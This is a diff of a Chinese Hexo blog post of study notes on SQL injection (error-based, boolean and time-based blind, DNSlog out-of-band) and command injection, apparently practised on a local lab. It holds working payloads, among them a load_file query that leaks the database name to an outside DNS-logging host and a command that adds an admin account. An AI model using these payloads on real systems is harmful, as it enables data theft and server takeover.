@@ -6,13 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives: 2020/9 | Hexo</title>
+  <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+  <meta name="description" content="sqli学习在mysql数据库中，单行注释有#和–，在实际操作中#号一般用%23来表示。而–则用–+来表示。因为在URL中，如果在最后加上– ，浏览器在发送请求的时候会把URL末尾的空格舍去，而用–+代替–，原因是+在URL被URL编码后会变成空格。与数据库相关的内容：information_schema，系统数据库，包含所有数据库相关信息。information_schema.schemata中">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/2020/09/index.html">
+<meta property="og:url" content="http://example.com/2020/09/04/%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="sqli学习在mysql数据库中，单行注释有#和–，在实际操作中#号一般用%23来表示。而–则用–+来表示。因为在URL中，如果在最后加上– ，浏览器在发送请求的时候会把URL末尾的空格舍去，而用–+代替–，原因是+在URL被URL编码后会变成空格。与数据库相关的内容：information_schema，系统数据库，包含所有数据库相关信息。information_schema.schemata中">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-09-04T09:24:08.959Z">
+<meta property="article:modified_time" content="2020-09-04T09:24:08.967Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -150,181 +154,219 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-注入学习" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="sqli学习"><a href="#sqli学习" class="headerlink" title="sqli学习"></a>sqli学习</h1><p>在mysql数据库中，单行注释有#和–，在实际操作中#号一般用%23来表示。而–则用–+来表示。因为在URL中，如果在最后加上– ，浏览器在发送请求的时候会把URL末尾的空格舍去，而用–+代替–，原因是+在URL被URL编码后会变成空格。<br>与数据库相关的内容：<br>information_schema，系统数据库，包含所有数据库相关信息。<br>information_schema.schemata中schema_name列，字段为所有数据库名称。<br>information_schema.tables中table_name列对应数据库所有表名，其中table_schema列是所有数据库名。<br>information_schema.columns中，column_name列对应所有列名，其中table_schema列也对应所有数据库名，table_name列也对应所有表名。<br>联合查询时需要将前面的查询结果限定为空集，后面的查询结果才能显示出来。<br>concat(),concat_ws()与及group_concat()的用法<br>其他相关知识点在文末附有相应链接，就不在这赘述了。</p>
+<p>information_schema，系统数据库，包含所有数据库相关信息。</p>
+<p>Information_schema库存在三张表</p>
+<p>information_schema.schemata中schema_name列，字段为所有数据库名称。</p>
+<p>information_schema.tables中table_name列对应数据库所有表名，其中table_schema列是所有数据库名。information_schema.columns中，column_name列对应所有列名，其中table_schema列也对应所有数据库名，table_name列也对应所有表名。</p>
+<p>SCHEMATA表下SCHEMA_NAME列所有数据库名</p>
+<p>TABLES下TABLE_NAME列所有表名</p>
+<p>Select (@@version)   查询当前数据库版本</p>
+<p>select database()   查询当前所使用的数据库<br>select version()    查询当前数据库版本</p>
+<p>攻击流程</p>
+<p>select group_concat(schema_name) from information_schema.schemata;</p>
+<p>group_concat将多个数据放在一行来显示</p>
+<p>sql注入几种类型</p>
+<ol>
+<li><p>报错注入</p>
+<p>为什么会造成报错注入：构造payload让信息通过错误信息回显出来</p>
+<p>什么场景下有用：1.查询不回显内容，但会打印错误信息</p>
+<p>​                               2.Update、Insert等子句，会打印错误信息（前面的union 不适合update语句）</p>
+<p>当执行的SQL语句出错时返回错误信息，在错误信息中返回数据库的内容，即可实现SQL注入。</p>
+<p>floor()<br>SELECT count(*) from information_schema.<code>TABLES</code> GROUP BY concat((select version()),floor(rand(0)*2)) group by对rand（）函数操作是产生了错误</p>
+<p>extractvalue()<br>extractvalue(1,concat(0x7e，(select user()),0x7e)) xpath语法导致的错误</p>
+<p>updatexml()<br>select updatexml(1,concat(0x7e,(select version()),0x7e),1) xpath语法导致的错误</p>
+</li>
+</ol>
+<p>2.</p>
+<p>布尔盲注<br>原理<br>布尔盲住指得是代码存在SQL注入漏洞，但是页面既不会回显数据，也不会回显错误信息，只返回 ”Right“ 和 ”Wrong”。</p>
+<p>通过构造语句，来判断数据库信息的正确性，通过页面返回的 ”真“ 和 ”假“ 来识别判断是否正确。</p>
+<p>布尔盲住过程中常用到的一些函数</p>
+<p>left() ：left(database(),1)&gt;’s’ ，databases() 显示数据库的名称，left(a,b)从左侧截取a的前b位</p>
+<p>regexp() : select user() regexp ‘^r’ ，正则表达式匹配</p>
+<p>like()：select user() like ‘ro%’ ，和regexp 类似</p>
+<p>substr()和ascii()：ascii(substr((select(database()),1,1))=98</p>
+<p>ord()和mid() : ord(mid((select user()),1,1))=114</p>
+<p>几个函数没什么好说，都是对字符串操作的函数，有一个地方需要关注下，有些场景单引号下会注入失败，使用ascii()等函数转为 ascii 码已适用于更多的场景。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-8/?id=1&#x27; and (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp &#x27;^em&#x27; --+</span><br><span class="line">http://127.0.0.1/Less-8/?id=1&#x27; and (select table_name from information_schema.tables where table_schema=database() limit 0,1) like &#x27;em%&#x27; --+</span><br><span class="line">http://127.0.0.1/Less-8/?id=1&#x27; and ascii(substr((select database()),1,1))=115 --+</span><br></pre></td></tr></table></figure>
+
+<p>数据库库、表、字段所有名称的可用字符范围为：A-Z、a-z、0-9和下划线。</p>
+<p>也就是 ASCII 码48到122，利用这点可快速的爆破出结果。</p>
+<p>3.时间盲注<br>原理<br>时间盲注：代码存在SQL注入漏洞，然而页面即不会回显数据，也不会回显错误信息，语句执行之后不提示真假，不能通过页面来进行判断。通过构造语句，通过页面响应的时长来判断信息。</p>
+<p>时间盲住的关键点在于 if()函数，通过条件语句进行判断，为真则立即执行，否则延时执行。</p>
+<p>例如 if(left(user(),1)=‘a’,0,sleep(3));</p>
+<p>例如if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23。</p>
+<p>3.DNSlog盲注<br>原理<br>DNSlog盲住其实属于带外攻击（Out Of Band），什么是带外攻击？</p>
+<p>很多场景下，无法看到攻击的回显，但是攻击行为确实生效了，通过服务器以外的其它方式提取数据，包括不限于 HTTP(S) 请求、DNS请求、文件系统、电子邮件等。</p>
+<p>事实上，带外攻击不限于 DNSlog 盲注场景下，比如命令执行、SQL注入、XXE等。</p>
+<p>先解释下DNSlog盲注的原理，借助应用的本身的功能发起DNS请求，盲注的结果作为DNS请求的一部分，DNSlog记录了DNS的请求，当然也记录了盲注的结果。</p>
+<p>如何发起DNS请求？对域名访问，解析域名即产生DNS请求。</p>
+<p>在关于我所了解的SQL注入中提过load_file函数，load_file在官方文档中描述为读取本地文件，然而在windows下的路径有一种命名惯例，名为UNC，本来的作用为共享文件与设备，UNC路径格式为\host-name\share-name\object-name,”hos-name”部分可以是FQDN,这个特性使得win下load_file的UNC可触发DNS请求，当然也限制了DNSlog盲注只限于 win 下。</p>
+<p>方法<br>一条典型的payload如下。</p>
+<p>select load_file(concat(‘\\‘,(select database()),’.7dxfaj.ceye.io\abc’))</p>
+<p>其中“7dxfaj.ceye.io”是“ceye.io”分配的子域名。”ceye.io”知道创宇404团队开发的一款记录DNSlog的平台，不仅能记录DNS请求，HTTP请求也同样。（就是日常崩）。</p>
+<p>为什么这里有四个“\”,因为转义的原因，</p>
+<p>攻击者首先提交注入语句select load_file(concat(‘\\‘,’攻击语句’,.XXX.ceye.io\abc))</p>
+<p>在数据库中攻击语句被执行，由concat函数将执行结果与XXX.ceye.io\abc拼接，构成一个新的域名，而mysql中的select load_file()可以发起请求，那么这一条带有数据库查询结果的域名就被提交到DNS服务器进行解析</p>
+<p>此时，如果我们可以查看DNS服务器上的Dnslog就可以得到SQL注入结果。那么我们如何获得这条DNS查询记录呢？注意注入语句中的ceye.io，这其实是一个开放的Dnslog平台（具体用法在官网可见），在<a target="_blank" rel="noopener" href="http://ceye.io上我们可以获取到有关ceye.io的dns查询信息.实际上在域名解析的过程中,是由顶级域名向下逐级解析的,我们构造的攻击语句也是如此,当它发现域名中存在ceye.io时,它会将这条域名信息转到相应的ns服务器上,而通过http//ceye.io%E6%88%91%E4%BB%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%9F%A5%E8%AF%A2%E5%88%B0%E8%BF%99%E6%9D%A1DNS%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95%E3%80%82">http://ceye.io上我们可以获取到有关ceye.io的DNS查询信息。实际上在域名解析的过程中，是由顶级域名向下逐级解析的，我们构造的攻击语句也是如此，当它发现域名中存在ceye.io时，它会将这条域名信息转到相应的NS服务器上，而通过http://ceye.io我们就可以查询到这条DNS解析记录。</a></p>
+<p>Dnslog盲注就是利用load——file()函数发起请求，使用Dnslog接受请求，获取数据的一种攻击方法</p>
+<p>SQL版本5.0以下没有information_schema表</p>
+<h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><p>命令执行定义<br>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p>
+<p>形成原因<br>脚本语言优点是简洁，方便，但也伴随着一些问题，如速度慢，无法解除系统底层，如果我们开发的应用需要一些除去web的特殊功能时，就需要调用一些外部程序。带来方便的同时也存在威胁。</p>
+<p>漏洞危害<br>继承Web服务程序的权限去执行系统命令或读写文件<br>反弹shell<br>控制整个网站甚至控制服务器<br>进一步内网渗透</p>
+<p>代码执行与命令执行的区别<br>命令执行漏洞：<br>直接调用操作系统命令(相当于在cmd下敲命令)<br>命令执行漏洞的原理：在操作系统中，“&amp;、|、||”都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令(如添加一个名为admin 密码为admin的用户 net user admin admin/add net localgroup administrators admin /add 加入管理员组（赋予管理员权限）)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">command1&amp;command2 两个命令同时执行</span><br><span class="line">command1&amp;&amp;command2 只有前面命令执行成功，后面命令才继续执行</span><br><span class="line">command1;command2 不管前面命令执行成功没有，后面的命令继续执行</span><br><span class="line">command1||command2 顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令</span><br></pre></td></tr></table></figure>
+
+<p>命令执行常用函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> 1. System：system函数可以用来执行一个外部的应用程序并将相应的执行结果输出，函数原型如下：</span><br><span class="line"> string system(string command, int&amp;return_var)</span><br><span class="line">其中，command是要执行的命令，return_var存放执行命令的执行后的状态值。</span><br><span class="line"> 2. Exec：exec函数可以用来执行一个外部的应用程序</span><br><span class="line">string exec (string command, array&amp;output, int &amp;return_var)</span><br><span class="line">其中，command是要执行的命令，output是获得执行命令输出的每一行字符串，return_var存放执行命令后的状态值。</span><br><span class="line"> 3.Passthru：passthru函数可以用来执行一个UNIX系统命令并显示原始的输出，当UNIX系统命令的输出是二进制的数据，并且需要直接返回值给浏览器时，需要使用passthru函数来替代system与exec函数。Passthru函数原型如下：</span><br><span class="line">void passthru (string command, int&amp;return_var)</span><br><span class="line">其中，command是要执行的命令，return_var存放执行命令后的状态值。</span><br><span class="line"> 4. Shell_exec：执行shell命令并返回输出的字符串，函数原型如下：</span><br><span class="line">string shell_exec (string command)</span><br><span class="line">其中，command是要执行的命令。</span><br></pre></td></tr></table></figure>
+
+<p>代码执行漏洞： 应用程序在调用一些能够将字符串转换为代码的函数（如PHP中的eval）时，没有考虑用户是否控制这个字符串，将造成代码执行漏洞。 很难通过黑盒查找漏洞，大部分都是根据源代码判断代码执行漏洞。</p>
+<p>代码执行相关函数： PHP: eval、assert、preg_replace()、+/e模式（PHP版本&lt;5.5.0）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">**1.代码层过滤不严</span><br><span class="line"> 商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函来调用：</span><br><span class="line">system(&quot;&#x2F;bin&#x2F;program --arg$arg&quot;);</span><br><span class="line">2.系统的漏洞造成命令注入</span><br><span class="line">bash破壳漏洞(CVE-2014-6271)</span><br><span class="line">3.调用的第三方组件存在代码执行漏洞</span><br><span class="line">如WordPress中用来处理图片的ImageMagick组件</span><br><span class="line">JAVA中的命令执行漏洞(struts2&#x2F;ElasticsearchGroovy等)</span><br><span class="line">ThinkPHP命令执行**</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/09/04/node.js%E8%B7%91%E9%A1%B9%E7%9B%AE%E5%87%86%E5%A4%87/" class="archive-article-date">
-  	<time datetime="2020-09-04T09:26:17.183Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-04</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2020/09/04/%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/09/04/python%E5%AD%A6%E4%B9%A0/" class="archive-article-date">
-  	<time datetime="2020-09-04T09:25:12.787Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-04</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/09/04/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/" class="archive-article-date">
-  	<time datetime="2020-09-04T09:24:54.479Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-04</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+<nav id="article-nav">
+  
+    <a href="/2020/09/04/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/09/04/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">我的第一篇博客文章</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/09/04/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2020-09-04T09:24:29.107Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-04</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/09/04/%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" class="archive-article-date">
-  	<time datetime="2020-09-04T09:24:08.959Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-04</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+        
+        
+    </div>
+</aside>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/09/04/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/" class="archive-article-date">
-  	<time datetime="2020-09-04T08:37:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-04</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/09/04/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/">我的第一篇博客文章</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/09/04/hello-world/" class="archive-article-date">
-  	<time datetime="2020-09-04T08:33:19.639Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/09/04/hello-world/">Hello World</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
 
 
           </div>
@@ -347,8 +389,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
